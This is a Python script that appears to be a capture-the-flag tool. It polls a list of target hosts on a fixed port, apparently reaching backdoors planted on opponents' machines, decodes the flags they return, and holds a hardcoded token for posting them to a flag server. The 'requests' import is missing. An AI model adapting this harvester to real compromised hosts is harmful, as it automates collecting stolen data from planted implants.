import multiprocessing
import logging
import socket
import time
import base64

def decode(s):
    s=base64.b64decode(s)
    s=s[:-7]+chr(ord(s[-7])-1)+s[-6:-5]+chr(ord(s[-5])-1)+s[-4:-3]+chr(ord(s[-3])-1)+s[-2:-1]+chr(ord(s[-1])-1)
    return s

show_only_changed=True
log_format='%(asctime)s %(message)s'
filename=r'targets.txt'

#config log->file and console
l=logging.INFO
#l=logging.DEBUG
logging.basicConfig(level=l,format=log_format,datefmt='%a, %d %b %Y %H:%M:%S',filename='server.log',filemode='w')
console=logging.StreamHandler()
console.setLevel(l)
formatter = logging.Formatter(log_format)
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

flags={}
curlu=r'http://172.16.100.5:9000/submit_flag/'

def curlflag(flag):
    r=requests.post(curlu,data={'flag':flag,'token':r'oDdcfREB94tu89X0txJWtQGK6uLm9rPC5n5kzLSJQfG3XnvJ367CJS2pWP6i0fo6b1FuajAPxMU'})
    r.close()
    #logging.debug(r.url+r.status_code)

def w(ip):
    global flags
    logging.debug(ip+' process Starting...')
    data=''
    s=None
    while True:
        try:
            data=''
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(3)
            logging.debug('connectting '+ip)
            s.connect((ip,55168))
            data=s.recv(2048)
            data=decode(data)
            data= "[ From "+ip+' ] '+data
        except Exception as e:
            data="[ From "+ip+' ] '+e.message
            logging.debug(data)
            data=''
        finally:
            if data:
                if not show_only_changed or  flags.get(ip)!=data:
                    flags[ip]=data
                    logging.info(data)
                    #curlflag(data[-60:])
                logging.debug(data)
            s.close()
            time.sleep(5)

if __name__=='__main__':
    logging.info('Starting server...')
    targets=[]
    for line in open(filename).readlines():
        targets.append(line.strip())
    logging.debug('Found targets:'+str(len(targets)))
    pool=multiprocessing.Pool(30)
    for target in targets:
        pool.apply_async(w,(target,))
    pool.close()
    pool.join()
    logging.info('Endding...')
